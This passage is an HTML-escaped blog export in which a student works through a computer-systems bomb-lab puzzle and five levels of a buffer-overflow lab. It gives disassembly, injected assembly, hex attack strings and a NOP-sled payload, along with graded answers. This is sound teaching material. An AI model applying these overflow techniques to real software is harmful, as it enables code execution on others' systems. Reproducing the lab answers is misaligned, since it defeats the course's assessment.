if(A[a]!&#x3D;A[i-1])&#x2F;&#x2F;** &#x2F;&#x2F;A[0]!&#x3D;A[1,2,3,4,5]; a++; &#x2F;&#x2F;A[1]!&#x3D;A[2,3,4,5]; if(a&gt;5) &#x2F;&#x2F;A[2]!&#x3D;A[3,4,5] break; &#x2F;&#x2F;A[3]!&#x3D;A[4,5] &#125; &#125; &#125; a&#x3D;0; do&#123; i&#x3D;a; t&#x3D;A[a]; ret&#x3D;1; t1&#x3D;0x804c13c; while(t&gt;1)&#123; if(ret!&#x3D;t)&#123; t1&#x3D;*(t1+8); ret++; &#125;else break; &#125; A[i+6]&#x3D;t1; a++; &#125;while(a!&#x3D;6); &#x2F;&#x2F;A[i]&#x3D;t1; a&#x3D;A[6]; ret&#x3D;A[7]; *(a+8)&#x3D;ret;&#x2F;&#x2F;*(A[6]+8)&#x3D;A[7] t1&#x3D;A[8]; *(ret+8)&#x3D;t1;&#x2F;&#x2F;*(A[7]+8)&#x3D;A[8] ret&#x3D;A[9];*（ *(t1+8)&#x3D;ret;&#x2F;&#x2F;*(A[8]+8)&#x3D;A[9] t1&#x3D;A[10]; *(ret+8)&#x3D;t1;&#x2F;&#x2F;*(A[9]+8)&#x3D;A[10] ret&#x3D;A[11]; *(t1+8)&#x3D;ret;&#x2F;&#x2F;*(A[10]+8)&#x3D;A[11] *(ret+8)&#x3D;0;&#x2F;&#x2F;*(A[11]+8)&#x3D;0 i&#x3D;5; while(i!&#x3D;0)&#123; ret&#x3D;*(a+8); ret&#x3D;*ret; if(*a&gt;&#x3D;ret)&#123;&#x2F;&#x2F;** a&#x3D;*(a+8);&#x2F;&#x2F;*A[6]&gt;&#x3D;*A[7] ~*A[10]&gt;&#x3D;*A[11] i--; &#125; &#125; &#125; 其中用**注释处（//**）的为过关必须满足条件，根据汇编语句中的条件转移指令可以看出输入的数组为无符号数，if(A[i]&lt;=6){//**处表示数组每个元素都要&lt;=6,后面的//**处的要求是数组内容不重复所以数组内容应该就是1 2 3 4 5 6，过关就应该是将这6个按特定顺序输入。后面就是给A[6]-A[11]赋值，而且A[6+i]和A[i]相关，关系由下面的语句确定 123456789101112i&#x3D;a;t&#x3D;A[a];ret&#x3D;1; t1&#x3D;0x804c13c;while(t&gt;1)&#123; if(ret!&#x3D;t)&#123; t1&#x3D;*(t1+8); ret++; &#125;else break; &#125;A[i+6]&#x3D;t1; 对于不同的a，循环次数是A[a]-1再看最后一个//*，总结起来的要求就是A[6]&gt;=A[7] &gt;=…&gt;=\\A[10]&gt;=*A[11],所以就看A[6]-A[11]的内容了，这时就要再看A[6+i]和A[i]的关系，发发现和0x804c13c这个地址处的内容有关，因为数组元素最大为6，所以循环最多执行5次，gdb中查看：p/x *(0x804c13c+8) = 0x804c148 //A[i]=2时A[i+6]的值p/x *(0x804c148+8) = 0x804c154 //A[i]=3时A[i+6]的值p/x *(0x804c154+8) = 0x804c160 //A[i]=4时A[i+6]的值p/x *(0x804c160+8) = 0x804c16c //A[i]=5时A[i+6]的值p/x *(0x804c16c+8) = 0x804c178 //A[i]=6时A[i+6]的值因为最后要求比较*A[i]（i=0，1，2，3，4，5）的内容所以再查看：p/u *(0x804c13c) = 884 //A[i]=1时*A[i+6]的值p/u *(0x804c148) = 351 //A[i]=2时*A[i+6]的值p/u *(0x804c154) = 262 //A[i]=3时*A[i+6]的值p/u *(0x804c160) = 395 //A[i]=4时*A[i+6]的值p/u *(0x804c16c) = 461 //A[i]=5时*A[i+6]的值p/u *(0x804c178) = 144 //A[i]=6时*A[i+6]的值因为A[6]&gt;=A[7] &gt;=…&gt;=\\A[10]&gt;=\\A[11]，所以A[6]最大，所以A[6+0]=884–&gt;A[0]=1….以此类推可得数组元素为：1 5 4 2 3 6实验二结束。。。 Lab3：缓冲区炸弹实验实验三相较于实验二感觉好做一点，因为csdn的博主给的讲解真的是保姆式的，跟着他上面的步骤除了最后一关出了点问题，都能很快做出来先生成自己的cookie：0x4d6a7905 任务一Smoke是给出来的，应该是让我们熟悉操作的， 任务二fizz:这关在第一关基础上加点过程调用的知识就很明了了吗，先看getbuf内容： 1234567891008049182 &lt;getbuf&gt;: 8049182: 55 push %ebp 8049183: 89 e5 mov %esp,%ebp 8049185: 83 ec 34 sub $0x34,%esp 8049188: 8d 45 d8 lea -0x28(%ebp),%eax 804918b: 50 push %eax 804918c: e8 24 fb ff ff call 8048cb5 &lt;Gets&gt; 8049191: b8 01 00 00 00 mov $0x1,%eax 8049196: c9 leave 8049197: c3 ret buf数组首地址是-0x28(%ebp)，距ebp有40个字节，再+4+4字节覆盖返回地址，但是要把自己的cookie当参数传给fizz所以fizz的ebp+8处应该放cookie，这里是fizz的地址： 1234567891011121314151617181920212223242508048c15 &lt;fizz&gt;: 8048c15: 55 push %ebp 8048c16: 89 e5 mov %esp,%ebp 8048c18: 83 ec 08 sub $0x8,%esp 8048c1b: 8b 45 08 mov 0x8(%ebp),%eax 8048c1e: 3b 05 28 d1 04 08 cmp 0x804d128,%eax 8048c24: 74 1d je 8048c43 &lt;fizz+0x2e&gt; 8048c26: 83 ec 04 sub $0x4,%esp 8048c29: 50 push %eax 8048c2a: 68 08 a1 04 08 push $0x804a108 8048c2f: 6a 01 push $0x1 8048c31: e8 3a fd ff ff call 8048970 &lt;__printf_chk@plt&gt; 8048c36: 83 c4 10 add $0x10,%esp 8048c39: 83 ec 0c sub $0xc,%esp 8048c3c: 6a 00 push $0x0 8048c3e: e8 7d fc ff ff call 80488c0 &lt;exit@plt&gt; 8048c43: 83 ec 04 sub $0x4,%esp 8048c46: 50 push %eax 8048c47: 68 b6 a2 04 08 push $0x804a2b6 8048c4c: 6a 01 push $0x1 8048c4e: e8 1d fd ff ff call 8048970 &lt;__printf_chk@plt&gt; 8048c53: c7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c5a: e8 47 06 00 00 call 80492a6 &lt;validate&gt; 8048c5f: 83 c4 10 add $0x10,%esp 8048c62: eb d5 jmp 8048c39 &lt;fizz+0x24&gt; 所以先要把fizz地址覆盖45-48字节，然后后面跟着8字节其中后4字节填cookie注意小端存放，所以有下面的攻击内容：00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 15 8c 04 08 00 00 00 00 05 79 6a 4d本关了解到一个新的点，就是返回地址处调用的函数的ebp就压栈在原先存放返回地址的地方 任务三bang： 1234567891011121314151617181920212223242508048c64 &lt;bang&gt;: 8048c64: 55 push %ebp 8048c65: 89 e5 mov %esp,%ebp 8048c67: 83 ec 08 sub $0x8,%esp 8048c6a: a1 20 d1 04 08 mov 0x804d120,%eax 8048c6f: 3b 05 28 d1 04 08 cmp 0x804d128,%eax 8048c75: 74 1d je 8048c94 &lt;bang+0x30&gt; 8048c77: 83 ec 04 sub $0x4,%esp 8048c7a: 50 push %eax 8048c7b: 68 d4 a2 04 08 push $0x804a2d4 8048c80: 6a 01 push $0x1 8048c82: e8 e9 fc ff ff call 8048970 &lt;__printf_chk@plt&gt; 8048c87: 83 c4 10 add $0x10,%esp 8048c8a: 83 ec 0c sub $0xc,%esp 8048c8d: 6a 00 push $0x0 8048c8f: e8 2c fc ff ff call 80488c0 &lt;exit@plt&gt; 8048c94: 83 ec 04 sub $0x4,%esp 8048c97: 50 push %eax 8048c98: 68 28 a1 04 08 push $0x804a128 8048c9d: 6a 01 push $0x1 8048c9f: e8 cc fc ff ff call 8048970 &lt;__printf_chk@plt&gt; 8048ca4: c7 04 24 02 00 00 00 movl $0x2,(%esp) 8048cab: e8 f6 05 00 00 call 80492a6 &lt;validate&gt; 8048cb0: 83 c4 10 add $0x10,%esp 8048cb3: eb d5 jmp 8048c8a &lt;bang+0x26&gt; 第二关用到了cookie，本关也有，猜想这也是个全局变量，在fizz中可以看到0x804d128是cookie的地址，所以在bang中确认0x804d120是global_value的地址，本关在字符数组里放入攻击机器代码，然后将数组首地址放到返回地址处，这样就可以完成任务了。构造.s文件内容： 1234movl $0x4d6a7905,%eaxmovl %eax,$0x804d120push $0x8048c64ret 前两句实现修改global_value的值，后面将bang函数地址入栈ret指令执行就可以跳到bang函数执行了。gdb中查看字符数组首地址，-0x28（ebp）=0x556838f8.s文件编译反汇编内容：b8 05 79 6a 4d89 04 25 20 d1 04 0868 64 8c 04 08c3所以攻击内容如下：b8 05 79 6a 4d89 04 25 20 d1 04 0868 64 8c 04 08c300 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00f8 38 68 55本关多加了一个修改一个全局变量的要求，所以就要用到包含指令的攻击字符串，当时ppt看到这部分时有点懵，因为没见过，那些工具也每用过，就感觉很高大尚，但是看过博主的介绍，和他的使用过程，很快就上手了。 第四关：因为不能改变原有的一些值，所以先查ebp，返回地址 1234567891008048c64 &lt;bang&gt;:08048d6b &lt;test&gt;: 8048d6b: 55 push %ebp 8048d6c: 89 e5 mov %esp,%ebp 8048d6e: 53 push %ebx 8048d6f: 83 ec 14 sub $0x14,%esp 8048d72: e8 d9 ff ff ff call 8048d50 &lt;uniqueval&gt; 8048d77: 89 45 f4 mov %eax,-0xc(%ebp) 8048d7a: e8 03 04 00 00 call 8049182 &lt;getbuf&gt; 8048d7f: 89 c3 mov %eax,%ebx 上面可以看出getbuf的返回地址是8048d77，bang函数地址：08048c64，gdb中打断点运行后查$ebp=0x55683940构造符合题意得攻击代码.s: 123mov $0x4d6a7905,%eaxpush $0x08048d7fret 将函数返回值赋为cookie值，然后将原来得返回地址压栈，然后就有下面得攻击内容：b8 05 79 6a 4d68 7f 8d 04 08c300 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 0040 39 68 55f8 38 68 55 40-43个字符是确保ebp处仍为原来的值第五关：第五关相较于第四关 ebp值每次运行都会变化，所以ebp处的值不能直接查看然后确定了，但是getbufn中ebp处的值是testn中ebp的值，所以观察testn函数： 1234567808048de0 &lt;testn&gt;: 8048de0: 55 push %ebp 8048de1: 89 e5 mov %esp,%ebp 8048de3: 53 push %ebx 8048de4: 83 ec 14 sub $0x14,%esp 8048de7: e8 64 ff ff ff call 8048d50 &lt;uniqueval&gt; 8048dec: 89 45 f4 mov %eax,-0xc(%ebp) 8048def: e8 a4 03 00 00 call 8049198 &lt;getbufn&gt; 在getbufn函数执行完ret指令后，esp和ebp就是与testn函数相关的，所以在gtbufn中的ebp处的值可以用%esp+0x18（push %ebx执行后%ebp=%esp+4，sub $0x14,%esp执行后%ebp=%esp+0x18），先构造攻击的.s文件： 1234movl $0x4d6a7905,%eaxleal 0x18(%esp),%ebppush $0x08048df4ret .s文件编译反汇编后的内容：b8 05 79 6a 4d8d 6c 24 1868 f4 8d 04 08c3 （这里讲个做题时出现的问题，也就本关卡了许久的地方，ppt里讲构造文件的方法是用gcc -m32 -c,然后再objdump -d 返汇编，但是当时我做题的时候是跟着csdn上的文章做的，上面的博主是用as 指令生成的.o文件（eg：as 2.s -o 2.o)这关我开始也是跟博主一样,用as指令，但是反汇编后leal 0x18(%esp),%ebp这句的机器代码相比于gcc编译反汇编产生的，多了一个67，如下：b8 05 79 6a 4d67 8d 6c 24 1868 f4 8d 04 08c3然后我就接着做，结果就是一直不过关，然后就是查百度，看了很多博主的代码都是15字节，发现我最开始的博主生成的也是15字节，感觉到不对劲（因为指令都一样，不一样的就是返回地址，和cookie，但这些都试4字节的，所以总字节数应该是一样的），就对比了许多博主的代码和自己的，于是尝试着把不同的（67）去了，试了一下，竟然成功了，然后再看ppt的方法，然后重新生成一下，结果和我改后的是一样的，但是我之前的.o文件都是as指令生成的，且没有出错，所以就凌乱了，不知道两种方法有啥区别，百度了也没找到啥有用信息。。。） 要构造攻击文件还需要知道数组的首地址，这样才能执行设计的攻击机器代码，这里获取的方法就是将整个过程运行一遍，每次getbufn调用后查看数组首地址，然后用空指令撬，取5次首地址最大的一个供攻击文件使用，（因为数组前面的大部分元素都是nop，要确保每次跳转都能跳在数组内部然后滑到有效指令处执行）我运行查看后数组首地址最大为0x55683748，然后在攻击文件里用的是0x55683758 1234567891008049198 &lt;getbufn&gt;: 8049198: 55 push %ebp 8049199: 89 e5 mov %esp,%ebp 804919b: 81 ec 14 02 00 00 sub $0x214,%esp 80491a1: 8d 85 f8 fd ff ff lea -0x208(%ebp),%eax 80491a7: 50 push %eax 80491a8: e8 08 fb ff ff call 8048cb5 &lt;Gets&gt; 80491ad: b8 01 00 00 00 mov $0x1,%eax 80491b2: c9 leave 80491b3: c3 ret 上面可以看到数组的正常空间是0x208（520字节），所以设计的攻击文件如下：90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 /* ‘90’*509 */b8 05 79 6a 4d8d 6c 24 1868 f4 8d 04 08c358 37 68 55到这里实验三结束，这个实验能完成主要还是博主写的真的很详细，不然自己写不知到要摸索到什么时候。。。","categories":[],"tags":[]},{"title":"test","slug":"test","date":"2020-10-11T09:07:43.000Z","updated":"2020-10-11T09:43:20.000Z","comments":true,"path":"2020/10/11/test/","link":"","permalink":"http://example.com/2020/10/11/test/","excerpt":"&nbsp;","text":"&nbsp;","categories":[],"tags":[]}],"categories":[],"tags":[]}